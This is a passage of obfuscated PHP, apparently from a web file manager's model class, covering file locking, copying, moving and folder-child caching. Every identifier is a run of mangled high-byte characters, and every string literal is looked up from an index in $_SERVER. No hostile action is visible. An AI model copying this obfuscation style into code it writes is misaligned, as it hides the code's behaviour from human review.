array($ì¯¶¾»è[564], $ì¯¶¾»è[566]), $êğ‚¼ú¨); $this->_lockParent($Ş²öÛåî, array($ì¯¶¾»è[564], $ì¯¶¾»è[566]), $êğ‚¼ú¨); $this->_lockCheckEnd($ì¯¶¾»è[565], $Ş²öÛåî); } public function lockWriteEnd($›Š›‰ï±, $¦Ş¨ş÷è = '') { $°—•ë =& $_SERVER[„Ç©ñÎ©]; if (!$this->allowLock()) { return; } $—Š§ğ°ï = 0; $this->_lockKey($°—•ë[569] . $›Š›‰ï± . $°—•ë[10] . $¦Ş¨ş÷è, $—Š§ğ°ï); $this->_lockEvent($›Š›‰ï±, array($°—•ë[564], $°—•ë[566]), $—Š§ğ°ï); $this->_lockParent($›Š›‰ï±, array($°—•ë[564], $°—•ë[566]), $—Š§ğ°ï); } public function lockMoveStart($ˆô¹à·à) { $’¤¨ôæê =& $_SERVER[„Ç©ñÎ©]; if (!$this->allowLock()) { return; } $this->_lockCheck($’¤¨ôæê[566], $ˆô¹à·à); $§¥áˆ¥Á = 1; $this->_lockKey($’¤¨ôæê[570] . $ˆô¹à·à, $§¥áˆ¥Á); $this->_lockEvent($ˆô¹à·à, array($’¤¨ôæê[564], $’¤¨ôæê[565]), $§¥áˆ¥Á); $this->_lockParent($ˆô¹à·à, array($’¤¨ôæê[564], $’¤¨ôæê[566]), $§¥áˆ¥Á); $this->_lockEvent($ˆô¹à·à, array($’¤¨ôæê[571], $’¤¨ôæê[567], $’¤¨ôæê[568]), $§¥áˆ¥Á); $this->_lockCheckEnd($’¤¨ôæê[566], $ˆô¹à·à); } public function lockMoveEnd($˜¾ÉĞÏ‘) { $È‘²Š™Š =& $_SERVER[„Ç©ñÎ©]; if (!$this->allowLock()) { return; } $îó´©¯à = 0; $this->_lockKey($È‘²Š™Š[570] . $˜¾ÉĞÏ‘, $îó´©¯à); $this->_lockEvent($˜¾ÉĞÏ‘, array($È‘²Š™Š[564], $È‘²Š™Š[565]), $îó´©¯à); $this->_lockParent($˜¾ÉĞÏ‘, array($È‘²Š™Š[564], $È‘²Š™Š[566]), $îó´©¯à); $this->_lockEvent($˜¾ÉĞÏ‘, array($È‘²Š™Š[571], $È‘²Š™Š[567], $È‘²Š™Š[568]), $îó´©¯à); } private function _lockCheck($¹ÚŸ•Ø›, $¯”â¯é”) { $•ù‚ÛÔù =& $_SERVER[„Ç©ñÎ©]; $†ÂàÓô£ = $this->sourceInfo($¯”â¯é”); $À„ëª£Ç = $¹ÚŸ•Ø› . $•ù‚ÛÔù[10] . $¯”â¯é”; $this->_lockTimeStart[$À„ëª£Ç] = timeFloat(); if (!is_array($†ÂàÓô£)) { return; } $óä·ï¦ = LNG($•ù‚ÛÔù[572]); CacheLock::setErrorMsg($•ù‚ÛÔù[172] . htmlspecialchars($†ÂàÓô£[$•ù‚ÛÔù[32]]) . $•ù‚ÛÔù[174] . $óä·ï¦); $this->_lockKey($À„ëª£Ç, 1); $this->_lockKey($À„ëª£Ç, 0); $ë„Ğ¡®À = array_reverse($this->parentLevelArray($†ÂàÓô£[$•ù‚ÛÔù[530]])); foreach ($ë„Ğ¡®À as $ÑâãøÍ) { $À„ëª£Ç = $¹ÚŸ•Ø› . $•ù‚ÛÔù[573] . $ÑâãøÍ; if (CacheLock::lockGet($•ù‚ÛÔù[574] . $À„ëª£Ç)) { $†ÂàÓô£ = $this->sourceInfo($ÑâãøÍ); CacheLock::setErrorMsg($•ù‚ÛÔù[172] . htmlspecialchars($†ÂàÓô£[$•ù‚ÛÔù[32]]) . $•ù‚ÛÔù[174] . $óä·ï¦); $this->_lockKey($À„ëª£Ç, 1); $this->_lockKey($À„ëª£Ç, 0); } } } private function _lockCheckEnd($„°ÆÈ˜—, $ÇÚ±¸¬Æ) { $Ñş’¾û‡ =& $_SERVER[„Ç©ñÎ©]; $ÌÃ–ıø = $„°ÆÈ˜— . $Ñş’¾û‡[10] . $ÇÚ±¸¬Æ; CacheLock::setErrorMsg($Ñş’¾û‡[387]); if (!isset($this->_lockTimeStart[$ÌÃ–ıø])) { return; } $ŠÜÊËµ× = timeFloat() - $this->_lockTimeStart[$ÌÃ–ıø]; unset($this->_lockTimeStart[$ÌÃ–ıø]); if ($ŠÜÊËµ× > 0.5) { unset(self::$cacheSourceInfo[$Ñş’¾û‡[469] . $ÇÚ±¸¬Æ]); } $¬ì©†çâ = $this->sourceInfo($ÇÚ±¸¬Æ); if (!$¬ì©†çâ) { show_json(LNG($Ñş’¾û‡[115]), !1); } } private function _lockParent($ËĞ¯Âİé, $ëÖëíÂõ, $öëî‡Ï¾) { if (!$this->autoLockSet) { return; } $ãªÙ’àê = $this->sourceInfo($ËĞ¯Âİé); if (!is_array($ãªÙ’àê)) { return; } $†õ„„Á­ = array_reverse($this->parentLevelArray($ãªÙ’àê[$_SERVER[„Ç©ñÎ©][530]])); foreach ($†õ„„Á­ as $¹èßÉ°Ä) { $this->_lockEvent($¹èßÉ°Ä, $ëÖëíÂõ, $öëî‡Ï¾); } } private function _lockEvent($ëĞœ€ê‰, $üöÎ‰§, $”“Ñ›Ôş) { $¯„ƒ¿‹ó =& $_SERVER[„Ç©ñÎ©]; if (!$this->autoLockSet) { return; } foreach ($üöÎ‰§ as $°Ğúµ§ü) { $Ş·¬¼“Ç = $°Ğúµ§ü . $¯„ƒ¿‹ó[10] . $ëĞœ€ê‰; if ($”“Ñ›Ôş && CacheLock::lockGet($¯„ƒ¿‹ó[574] . $Ş·¬¼“Ç)) { continue; } $this->_lockKey($Ş·¬¼“Ç, $”“Ñ›Ôş); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($£è³ëá¡, $²ÛÉ¦æ = 1) { $Üùœ¿ = $_SERVER[„Ç©ñÎ©][574] . md5($£è³ëá¡); if ($²ÛÉ¦æ) { if (isset(self::$_lockItemArr[$Üùœ¿])) { return; } self::$_lockItemArr[$Üùœ¿] = 1; CacheLock::lock($Üùœ¿, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Üùœ¿])) { return; } unset(self::$_lockItemArr[$Üùœ¿]); CacheLock::unlock($Üùœ¿); } } public function isParentOf($¹ß«ıÊï, $¶©½£¨¾) { $™´¯ø =& $_SERVER[„Ç©ñÎ©]; $ãâõ¬ = $this->sourceInfo($¹ß«ıÊï); $€ÔÅà¦œ = $this->sourceInfo($¶©½£¨¾); $ôÔ¬³Å = $ãâõ¬[$™´¯ø[530]] . $ãâõ¬[$™´¯ø[411]] . $™´¯ø[50]; $Ì Şß† = $€ÔÅà¦œ[$™´¯ø[530]] . $€ÔÅà¦œ[$™´¯ø[411]] . $™´¯ø[50]; $øøıÖˆä = strpos($Ì Şß†, $ôÔ¬³Å) === 0; return $øøıÖˆä; } private $targetIsDelete = 0; public function copy($©™¼Š, $½ ´°Ä, $½™ı¿ë‘ = REPEAT_REPLACE, $ÉÜî‡§° = '') { $šÄÑ’ö½ =& $_SERVER[„Ç©ñÎ©]; $ÒáîÍ–¸ = $this->sourceInfo($©™¼Š); $³å—æ®§ = $this->sourceInfo($½ ´°Ä); if (!$ÒáîÍ–¸ || !$³å—æ®§ || $³å—æ®§[$šÄÑ’ö½[419]] != $šÄÑ’ö½[98]) { return !1; } if ($this->isParentOf($©™¼Š, $½ ´°Ä)) { return !1; } $²ûİÑƒğ = $ÉÜî‡§° ? $ÉÜî‡§° : $ÒáîÍ–¸[$šÄÑ’ö½[32]]; $this->lockCopyStart($©™¼Š); $this->lockWriteStart($½ ´°Ä, $²ûİÑƒğ); $’“µ¯¼Ş = array($šÄÑ’ö½[575] => array(), $šÄÑ’ö½[576] => array(), $šÄÑ’ö½[577] => array()); $this->targetIsDelete = intval($ÒáîÍ–¸[$šÄÑ’ö½[440]]); $Ô¢³Øæ˜ = $this->fileNameExistCache($½ ´°Ä, $ÒáîÍ–¸[$šÄÑ’ö½[32]]); $Üôöó„” = $this->_copy($©™¼Š, $½ ´°Ä, $½™ı¿ë‘, $’“µ¯¼Ş, !0, $ÉÜî‡§°); $this->_childrenListClear(); $this->lockCopyEnd($©™¼Š); $this->lockWriteEnd($½ ´°Ä, $²ûİÑƒğ); if ($ÒáîÍ–¸[$šÄÑ’ö½[419]] == $šÄÑ’ö½[98] && $Ô¢³Øæ˜ == $Üôöó„”) { $this->folderSizeResetChildren($Ô¢³Øæ˜); } Model($šÄÑ’ö½[578])->addAll($’“µ¯¼Ş[$šÄÑ’ö½[576]], array(), !0); if ($Ô¢³Øæ˜ != $Üôöó„” || $ÒáîÍ–¸[$šÄÑ’ö½[419]] == $šÄÑ’ö½[98]) { Model($šÄÑ’ö½[579])->eventCopy($Üôöó„”); } $this->saveAll($’“µ¯¼Ş[$šÄÑ’ö½[577]]); Model($šÄÑ’ö½[209])->linkAdd($’“µ¯¼Ş[$šÄÑ’ö½[575]]); $this->folderSizeReset($½ ´°Ä); $this->updateModifyTime($½ ´°Ä); return $Üôöó„”; } private function _copy($¾–¡–®ı, $®Ø•Öï, $ÌĞ®š½İ, &$æ»ÑÑÙ, $ÈÎöÓÃ, $•ÚüÎÅ‰ = '') { $¼ùüá… =& $_SERVER[„Ç©ñÎ©]; $‰¢æõØØ = $this->sourceInfoCache($¾–¡–®ı); $¼½…ò = $‰¢æõØØ[$¼ùüá…[419]] == $¼ùüá…[98]; $Š¹³õİ = $•ÚüÎÅ‰ ? $•ÚüÎÅ‰ : $‰¢æõØØ[$¼ùüá…[32]]; $Á³”öÂ• = $this->fileNameExistCache($®Ø•Öï, $Š¹³õİ); if ($ÈÎöÓÃ) { $this->_childrenAllMake($¾–¡–®ı); if ($¼½…ò && $Á³”öÂ•) { $this->_childrenAllMake($Á³”öÂ•); } } if (!$Á³”öÂ•) { return $this->_copyCreate($¾–¡–®ı, $®Ø•Öï, $Š¹³õİ, $æ»ÑÑÙ); } $áú“¯¤€ = $Á³”öÂ•; if ($¼½…ò) { if ($ÌĞ®š½İ == REPEAT_RENAME_FOLDER) { $Š¹³õİ = $this->fileNameAutoCache($®Ø•Öï, $Š¹³õİ, $ÌĞ®š½İ, $¼½…ò); $áú“¯¤€ = $this->_copyCreate($¾–¡–®ı, $®Ø•Öï, $Š¹³õİ, $æ»ÑÑÙ); } else { $‡ïİëàÂ = $this->_childrenList($¾–¡–®ı); foreach ($‡ïİëàÂ as $«¿£Á„) { $this->_copy($«¿£Á„[$¼ùüá…[411]], $Á³”öÂ•, $ÌĞ®š½İ, $æ»ÑÑÙ, !1); } } } else { if ($ÌĞ®š½İ == REPEAT_RENAME || $ÌĞ®š½İ == REPEAT_RENAME_FOLDER) { $Š¹³õİ = $this->fileNameAutoCache($®Ø•Öï, $Š¹³õİ, $ÌĞ®š½İ, $¼½…ò); $áú“¯¤€ = $this->_copyCreate($¾–¡–®ı, $®Ø•Öï, $Š¹³õİ, $æ»ÑÑÙ); } else { if ($ÌĞ®š½İ == REPEAT_REPLACE) { $ø“©ó¹ç = $this->sourceInfoCache($Á³”öÂ•); $ÖÂ§úÔ = $this->fileHistory($ø“©ó¹ç, $‰¢æõØØ[$¼ùüá…[477]], $‰¢æõØØ[$¼ùüá…[86]]); if ($ÖÂ§úÔ) { $æ»ÑÑÙ[$¼ùüá…[575]][] = $‰¢æõØØ[$¼ùüá…[477]]; } } else { if ($ÌĞ®š½İ == REPEAT_SKIP) { } } } Hook::trigger($¼ùüá…[580], array($¼ùüá…[581], $‰¢æõØØ, 0)); } return $áú“¯¤€; } private function _copyCreate($ˆ¶·ıÅ, $÷•Ú’•È, $ØÑ¿¹Å, &$ºçå·éÇ) { $šï¬şÏú =& $_SERVER[„Ç©ñÎ©]; $ş»óôÉİ = $this->sourceInfoCache($ˆ¶·ıÅ); $ú›ÒìâÒ = $this->sourceInfoCache($÷•Ú’•È); $ê·ãı¨ = $this->_makeItemData($ş»óôÉİ, $ú›ÒìâÒ, $ØÑ¿¹Å); Hook::trigger($šï¬şÏú[582], $ê·ãı¨); Hook::trigger($šï¬şÏú[583], array($šï¬şÏú[584], $ê·ãı¨, 0)); $æç€ç— = $this->add($ê·ãı¨); $±òÖÅß÷ = array($šï¬şÏú[411] => $æç€ç—, $šï¬şÏú[32] => $ØÑ¿¹Å); $this->_copyApplyMeta($±òÖÅß÷, $ºçå·éÇ); if ($ş»óôÉİ[$šï¬şÏú[419]] != $šï¬şÏú[98]) { $ºçå·éÇ[$šï¬şÏú[575]][] = $ş»óôÉİ[$šï¬şÏú[477]]; return $æç€ç—; } $Õô¶ú¨¸ = array(); $²’£ºÃ½ = array(); $this->_childrenListAll($ˆ¶·ıÅ, $Õô¶ú¨¸); $×Ù×‡¼× = count($Õô¶ú¨¸); if ($×Ù×‡¼× == 0) { return $æç€ç—; } $İòŞ¤‚¨ = $this->sourceInfo($æç€ç—); foreach ($Õô¶ú¨¸ as $Û®î³) { $ÛÀíÓ¥ = $this->_makeItemData($Û®î³, $İòŞ¤‚¨, $Û®î³[$šï¬şÏú[32]]); $ÛÀíÓ¥[$šï¬şÏú[530]] = $Û®î³[$šï¬şÏú[530]]; $²’£ºÃ½[] = $ÛÀíÓ¥; } $this->chunkEventSet($šï¬şÏú[585], array($šï¬şÏú[586], $ê·ãı¨, $×Ù×‡¼×)); $this->addAll($²’£ºÃ½, array(), !1); $¥•Ù„µ½ = $this->where(array($šï¬şÏú[441] => $æç€ç—))->select(); $‰¥½Øì‡ = $this->_childrenMakeRelation($Õô¶ú¨¸, $¥•Ù„µ½); $‰¥½Øì‡[$ˆ¶·ıÅ] = $æç€ç—; $å‚ÓüşÍ = array(); $ÛãÆó¡¬ = array(); foreach ($¥•Ù„µ½ as $Û®î³) { $§—§ïŒ§ = $Û®î³[$šï¬şÏú[411]]; $¶±¶¬ş¾ = $this->_childrenMatch($‰¥½Øì‡, $Û®î³, $İòŞ¤‚¨); $å‚ÓüşÍ[] = array($šï¬şÏú[411], $§—§ïŒ§, $šï¬şÏú[441], $¶±¶¬ş¾[$šï¬şÏú[441]]); $ÛãÆó¡¬[] = array($šï¬şÏú[411], $§—§ïŒ§, $šï¬şÏú[530], $¶±¶¬ş¾[$šï¬şÏú[530]]); $this->_copyApplyMeta($Û®î³, $ºçå·éÇ); if ($Û®î³[$šï¬şÏú[419]] != $šï¬şÏú[98]) { $ºçå·éÇ[$šï¬şÏú[575]][] = $Û®î³[$šï¬şÏú[477]]; } } $this->chunkEventSet($šï¬şÏú[587], array($šï¬şÏú[588], $ê·ãı¨, $×Ù×‡¼×)); $this->saveAll($å‚ÓüşÍ); $this->chunkEventSet($šï¬şÏú[589], array($šï¬şÏú[590], $ê·ãı¨, $×Ù×‡¼×)); $this->saveAll($ÛãÆó¡¬); return $æç€ç—; } private function _childrenMakeRelation($æº¨Îã², $ç×µÂ°) { $³–˜…˜ï =& $_SERVER[„Ç©ñÎ©]; $¼æˆ¡³ = array(); $©“ºš›õ = array(); foreach ($æº¨Îã² as $·ú—û„) { $Ášõè„‡ = $·ú—û„[$³–˜…˜ï[32]] . $³–˜…˜ï[8] . $·ú—û„[$³–˜…˜ï[530]]; $¼æˆ¡³[$Ášõè„‡] = $·ú—û„[$³–˜…˜ï[411]]; } foreach ($ç×µÂ° as $·ú—û„) { $Ášõè„‡ = $·ú—û„[$³–˜…˜ï[32]] . $³–˜…˜ï[8] . $·ú—û„[$³–˜…˜ï[530]]; $ü¬ş¢ı¾ = $¼æˆ¡³[$Ášõè„‡]; $©“ºš›õ[$ü¬ş¢ı¾] = $·ú—û„[$³–˜…˜ï[411]]; } return $©“ºš›õ; } private function _childrenMatch($­«ÊŞÍ±, $¸í¿œì‡, $‚—›¶—°) { $Ÿ÷é¾ƒ› =& $_SERVER[„Ç©ñÎ©]; $ßüá»î = $‚—›¶—°[$Ÿ÷é¾ƒ›[530]]; $ÇüÖ³„ = $this->parentLevelArray($¸í¿œì‡[$Ÿ÷é¾ƒ›[530]]); foreach ($ÇüÖ³„ as $ÒÅÚÙÚÄ) { if (isset($­«ÊŞÍ±[$ÒÅÚÙÚÄ])) { $ßüá»î .= $­«ÊŞÍ±[$ÒÅÚÙÚÄ] . $Ÿ÷é¾ƒ›[591]; } } $ßüá»î = rtrim($ßüá»î, $Ÿ÷é¾ƒ›[50]) . $Ÿ÷é¾ƒ›[50]; $Ù¶¾ïªë = $this->parentLevelArray($ßüá»î); $×ìÑü—Ò = $Ù¶¾ïªë[count($Ù¶¾ïªë) - 1]; return array($Ÿ÷é¾ƒ›[441] => $×ìÑü—Ò, $Ÿ÷é¾ƒ›[530] => $ßüá»î); } private function _makeItemData($ü‡—µ”, $ßé´ø¨Ì, $ŠŠ×’±ä) { $ˆ×–ıÖ½ =& $_SERVER[„Ç©ñÎ©]; $‰åŸ‰÷’ = array($ˆ×–ıÖ½[592] => $ü‡—µ”[$ˆ×–ıÖ½[419]], $ˆ×–ıÖ½[429] => $ŠŠ×’±ä, $ˆ×–ıÖ½[593] => $ü‡—µ”[$ˆ×–ıÖ½[421]] ? $ü‡—µ”[$ˆ×–ıÖ½[421]] : $ˆ×–ıÖ½[12], $ˆ×–ıÖ½[478] => $ü‡—µ”[$ˆ×–ıÖ½[477]] ? $ü‡—µ”[$ˆ×–ıÖ½[477]] : 0, $ˆ×–ıÖ½[594] => $ü‡—µ”[$ˆ×–ıÖ½[86]] ? $ü‡—µ”[$ˆ×–ıÖ½[86]] : 0, $ˆ×–ıÖ½[595] => intval($ßé´ø¨Ì[$ˆ×–ıÖ½[420]]), $ˆ×–ıÖ½[596] => intval($ßé´ø¨Ì[$ˆ×–ıÖ½[514]]), $ˆ×–ıÖ½[597] => intval(USER_ID), $ˆ×–ıÖ½[598] => intval(USER_ID), $ˆ×–ıÖ½[410] => intval($ßé´ø¨Ì[$ˆ×–ıÖ½[411]]), $ˆ×–ıÖ½[599] => $ßé´ø¨Ì[$ˆ×–ıÖ½[530]] . $ßé´ø¨Ì[$ˆ×–ıÖ½[411]] . $ˆ×–ıÖ½[50], $ˆ×–ıÖ½[433] => $ü‡—µ”[$ˆ×–ıÖ½[95]] ? $ü‡—µ”[$ˆ×–ıÖ½[95]] : time(), $ˆ×–ıÖ½[439] => 0, $ˆ×–ıÖ½[600] => $ˆ×–ıÖ½[12]); return $‰åŸ‰÷’; } private function _copyApplyMeta($äáÊŒ™, &$ÊöÂ–) { $Ø¬üÄñ« =& $_SERVER[„Ç©ñÎ©]; $Ò‰¸–ûû = $äáÊŒ™[$Ø¬üÄñ«[411]]; $ÑêÓ‚èù = $äáÊŒ™[$Ø¬üÄñ«[32]]; if (!isset($äáÊŒ™[$Ø¬üÄñ«[601]]) || !$äáÊŒ™[$Ø¬üÄñ«[601]] || $äáÊŒ™[$Ø¬üÄñ«[601]] == $Ø¬üÄñ«[207]) { $ÊöÂ–[$Ø¬üÄñ«[577]][] = array($Ø¬üÄñ«[411], $Ò‰¸–ûû, $Ø¬üÄñ«[601], short_id($Ò‰¸–ûû)); } if (Input::check($ÑêÓ‚èù, $Ø¬üÄñ«[602])) { $ÊöÂ–[$Ø¬üÄñ«[576]][] = array($Ø¬üÄñ«[411] => $Ò‰¸–ûû, $Ø¬üÄñ«[104] => $Ø¬üÄñ«[474], $Ø¬üÄñ«[383] => str_replace($Ø¬üÄñ«[53], $Ø¬üÄñ«[12], Pinyin::get($ÑêÓ‚èù))); $ÊöÂ–[$Ø¬üÄñ«[576]][] = array($Ø¬üÄñ«[411] => $Ò‰¸–ûû, $Ø¬üÄñ«[104] => $Ø¬üÄñ«[473], $Ø¬üÄñ«[383] => Pinyin::get($ÑêÓ‚èù, $Ø¬üÄñ«[603])); } $ÊöÂ–[$Ø¬üÄñ«[576]][] = array($Ø¬üÄñ«[411] => $Ò‰¸–ûû, $Ø¬üÄñ«[104] => $Ø¬üÄñ«[453], $Ø¬üÄñ«[383] => KodSort::makeStr($ÑêÓ‚èù)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ôô‘ÉÖ) { $øÀîœç¯ =& $_SERVER[„Ç©ñÎ©]; $Â—ÑŒˆ = $this->sourceInfo($ôô‘ÉÖ); $‡ÇçÙõï = $øÀîœç¯[604]; $ø–¡Í„Ï = array($øÀîœç¯[530] => array($øÀîœç¯[559], $Â—ÑŒˆ[$øÀîœç¯[530]] . $ôô‘ÉÖ . $øÀîœç¯[560]), $øÀîœç¯[440] => $this->targetIsDelete); $ãÚ’¶À = $this->field($‡ÇçÙõï)->where($ø–¡Í„Ï)->select(); if (!$ãÚ’¶À) { return; } $ãÚ’¶À = array_to_keyvalue($ãÚ’¶À, $øÀîœç¯[411]); foreach ($ãÚ’¶À as $âîƒÖŞ) { $Ç š²› = $âîƒÖŞ[$øÀîœç¯[441]]; $ôô‘ÉÖ = $âîƒÖŞ[$øÀîœç¯[411]]; if (!isset($this->_childrenListCache[$ôô‘ÉÖ]) && $âîƒÖŞ[$øÀîœç¯[419]] == $øÀîœç¯[98]) { $this->_childrenListCache[$ôô‘ÉÖ] = array(); } if (!isset($this->_childrenListCache[$Ç š²›])) { $this->_childrenListCache[$Ç š²›] = array(); } $this->_childrenListCache[$Ç š²›][$ôô‘ÉÖ] = $âîƒÖŞ; $this->_childrenItemCache[$ôô‘ÉÖ] = $âîƒÖŞ; } } private function _childrenListAll($üĞ÷Èº©, &$­«¼°¾) { $œ¯Úó¦¢ =& $_SERVER[„Ç©ñÎ©]; if (!isset($this->_childrenListCache[$üĞ÷Èº©])) { return; } $¡–Ã¾Š‹ = $this->_childrenListCache[$üĞ÷Èº©]; foreach ($¡–Ã¾Š‹ as $€Ù˜ŠæÓ => $¯¡á·ç) { $­«¼°¾[$€Ù˜ŠæÓ] = $¯¡á·ç; if ($¯¡á·ç[$œ¯Úó¦¢[419]] == $œ¯Úó¦¢[98]) { $this->_childrenListAll($€Ù˜ŠæÓ, $­«¼°¾); } } } private function sourceInfoCache($’³¾†»Ë) { if (isset($this->_childrenItemCache[$’³¾†»Ë])) { return $this->_childrenItemCache[$’³¾†»Ë]; } return $this->sourceInfo($’³¾†»Ë); } private function _childrenList($¼ÉïÃò») { if (isset($this->_childrenListCache[$¼ÉïÃò»])) { return $this->_childrenListCache[$¼ÉïÃò»]; } return $this->_childrenListSelect($¼ÉïÃò»); } private function _childrenListSelect($®ÒÖ½¿Û) { $ñ“ÒÃÀ  =& $_SERVER[„Ç©ñÎ©]; $…†È™îš = array($ñ“ÒÃÀ [441] => $®ÒÖ½¿Û, $ñ“ÒÃÀ [440] => $this->targetIsDelete); $´§ã“‹™ = $this->where($…†È™îš)->select(); $´§ã“‹™ = $´§ã“‹™ ? $´§ã“‹™ : array(); $‚Šˆ»¡¾ = array_to_keyvalue($´§ã“‹™, $ñ“ÒÃÀ [411]); $this->_childrenListCache[$®ÒÖ½¿Û] = $‚Šˆ»¡¾; foreach ($‚Šˆ»¡¾ as $®ÒÖ½¿Û => $œà¿Ï‚Ø) { $this->_childrenItemCache[$®ÒÖ½¿Û] = $œà¿Ï‚Ø; } return $‚Šˆ»¡¾; } private function fileNameExistCache($¨±§¾‹£, $„¡§„ã¹) { $ˆêÔƒâÏ =& $_SERVER[„Ç©ñÎ©]; $„¡§„ã¹ = strtolower($„¡§„ã¹); $æË¡­ïä = $this->_childrenList($¨±§¾‹£); foreach ($æË¡­ïä as $¾‘İÄÛ) { if ($„¡§„ã¹ == strtolower($¾‘İÄÛ[$ˆêÔƒâÏ[32]])) { return $¾‘İÄÛ[$ˆêÔƒâÏ[411]]; } } return !1; } private function fileNameAutoCache($ßÖëÇ€½, $…‡ó†Áè, $ÇŒëª”€, $èÌíÏ»Ë) { $å‡ğ˜°İ =& $_SERVER[„Ç©ñÎ©]; $íÅ•Ôˆ = $this->_childrenList($ßÖëÇ€½); $ğŞÃÜ­å = array_to_keyvalue($íÅ•Ôˆ, $å‡ğ˜°İ[12], $å‡ğ˜°İ[32]); return $this->fileNameAutoGet($ğŞÃÜ­å, $…‡ó†Áè, $ÇŒëª”€, $èÌíÏ»Ë); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Ãª¼¶ÉÁ, $Õ™úÊÅª, $×û·Â¹… = REPEAT_REPLACE, $…ÇĞ…³¯ = '') { $£îÎİ· =& $_SERVER[„Ç©ñÎ©]; $ûÚšàŞ = $this->sourceInfo($Ãª¼¶ÉÁ); $º¥ü‚óô = $this->sourceInfo($Õ™úÊÅª); if ($ûÚšàŞ[$£îÎİ·[441]] == $º¥ü‚óô[$£îÎİ·[411]]) { if ($ûÚšàŞ[$£îÎİ·[440]] == $£îÎİ·[98]) { Model($£îÎİ·[438])->restore(array($Ãª¼¶ÉÁ)); } if (!$…ÇĞ…³¯ || $…ÇĞ…³¯ == $ûÚšàŞ[$£îÎİ·[32]]) { return $Ãª¼¶ÉÁ; } } $—·ÄÉÍÎ = $this->pathInfoMore($Ãª¼¶ÉÁ); if ($this->isParentOf($Ãª¼¶ÉÁ, $Õ™úÊÅª)) { return !1; } if (!$ûÚšàŞ || !$º¥ü‚óô || $º¥ü‚óô[$£îÎİ·[419]] != $£îÎİ·[98]) { return !1; } Hook::trigger($£îÎİ·[605], $—·ÄÉÍÎ); $this->targetIsDelete = intval($ûÚšàŞ[$£îÎİ·[440]]); if ($ûÚšàŞ[$£îÎİ·[441]] == $Õ™úÊÅª && $…ÇĞ…³¯ != $ûÚšàŞ[$£îÎİ·[32]]) { $…ØŸşœÊ = $this->fileNameExist($Õ™úÊÅª, $…ÇĞ…³¯); if ($…ØŸşœÊ && $ûÚšàŞ[$£îÎİ·[419]] == $£îÎİ·[207]) { $ÛşìèÈÈ = $this->sourceInfo($…ØŸşœÊ); $–ä¢—’ù = $this->fileHistory($ÛşìèÈÈ, $ûÚšàŞ[$£îÎİ·[477]], $ûÚšàŞ[$£îÎİ·[86]]); if (!$–ä¢—’ù) { Model($£îÎİ·[480])->remove($ûÚšàŞ[$£îÎİ·[477]]); } $this->removeNow($Ãª¼¶ÉÁ, !1); $this->folderSizeReset($Õ™úÊÅª); Hook::trigger($£îÎİ·[606], $—·ÄÉÍÎ); return $…ØŸşœÊ; } } $‡ÅèßÈÃ = $…ÇĞ…³¯ ? $…ÇĞ…³¯ : $ûÚšàŞ[$£îÎİ·[32]]; $this->lockMoveStart($Ãª¼¶ÉÁ); $this->lockWriteStart($Õ™úÊÅª, $‡ÅèßÈÃ); $©ëüŠ±¹ = array($£îÎİ·[575] => array(), $£îÎİ·[607] => !1); $this->clearShare($Ãª¼¶ÉÁ, $Õ™úÊÅª); $€ÆšêÌÍ = $this->fileNameExistCache($Õ™úÊÅª, $ûÚšàŞ[$£îÎİ·[32]]); $½š¾ó = $this->_move($Ãª¼¶ÉÁ, $Õ™úÊÅª, $×û·Â¹…, $©ëüŠ±¹, $…ÇĞ…³¯); $this->sourceCacheClear(); if ($ûÚšàŞ[$£îÎİ·[419]] == $£îÎİ·[98] && $€ÆšêÌÍ) { $this->folderSizeResetChildren($½š¾ó); } Model($£îÎİ·[209])->linkAdd($©ëüŠ±¹[$£îÎİ·[575]]); if ($€ÆšêÌÍ && $©ëüŠ±¹[$£îÎİ·[607]]) { $this->removeNow($Ãª¼¶ÉÁ, !1); } $this->lockMoveEnd($Ãª¼¶ÉÁ); $this->lockWriteEnd($Õ™úÊÅª, $‡ÅèßÈÃ); $this->folderSizeReset($ûÚšàŞ[$£îÎİ·[441]]); $this->folderSizeReset($Õ™úÊÅª); $ˆ²ÄÓò = array($ûÚšàŞ[$£îÎİ·[441]], $Õ™úÊÅª); if ($ûÚšàŞ[$£îÎİ·[419]] == $£îÎİ·[98]) { $ˆ²ÄÓò[] = $Ãª¼¶ÉÁ; } $this->updateModifyTime($ˆ²ÄÓò); Model($£îÎİ·[579])->eventMove($Ãª¼¶ÉÁ, $ûÚšàŞ[$£îÎİ·[441]], $Õ™úÊÅª); Hook::trigger($£îÎİ·[606], $—·ÄÉÍÎ); return $½š¾ó; } private function _move($Š‚êÔË§, $²•×µ‹µ, $¶»‚ÏÂ³, &$Óğ‚ÑâÌ, $Ù×¡‹œ× = '') { $È´çÚÇô =& $_SERVER[„Ç©ñÎ©]; $ËûŒÇâ = $this->sourceInfo($Š‚êÔË§); $êÌ®™ĞÃ = $ËûŒÇâ[$È´çÚÇô[419]] == $È´çÚÇô[98]; $é×¡”Ó– = $Ù×¡‹œ× ? $Ù×¡‹œ× : $ËûŒÇâ[$È´çÚÇô[32]]; $Òá¥ÛŸ„ = $this->fileNameExistCache($²•×µ‹µ, $é×¡”Ó–); $this->lockMoveStart($Š‚êÔË§); $this->lockWriteStart($²•×µ‹µ, $é×¡”Ó–); if (!$Òá¥ÛŸ„) { return $this->_moveForce($Š‚êÔË§, $²•×µ‹µ, $é×¡”Ó–); } $…‰ÑÕ€“ = $Òá¥ÛŸ„; $÷ÊëúíŸ = !1; if ($êÌ®™ĞÃ) { if ($¶»‚ÏÂ³ == REPEAT_RENAME_FOLDER) { $é×¡”Ó– = $this->fileNameAuto($²•×µ‹µ, $é×¡”Ó–, $¶»‚ÏÂ³, $êÌ®™ĞÃ); $…‰ÑÕ€“ = $this->_moveForce($Š‚êÔË§, $²•×µ‹µ, $é×¡”Ó–); } else { if ($¶»‚ÏÂ³ == REPEAT_RENAME_FOLDER) { $¶»‚ÏÂ³ = REPEAT_RENAME; } $ó¡©Õ±ó = $this->_childrenListSelect($Š‚êÔË§); foreach ($ó¡©Õ±ó as $®§ùûİ‰) { $this->_move($®§ùûİ‰[$È´çÚÇô[411]], $Òá¥ÛŸ„, $¶»‚ÏÂ³, $Óğ‚ÑâÌ); } $÷ÊëúíŸ = !0; } } else { if ($¶»‚ÏÂ³ == REPEAT_SKIP) { $÷ÊëúíŸ = !0; } else { if 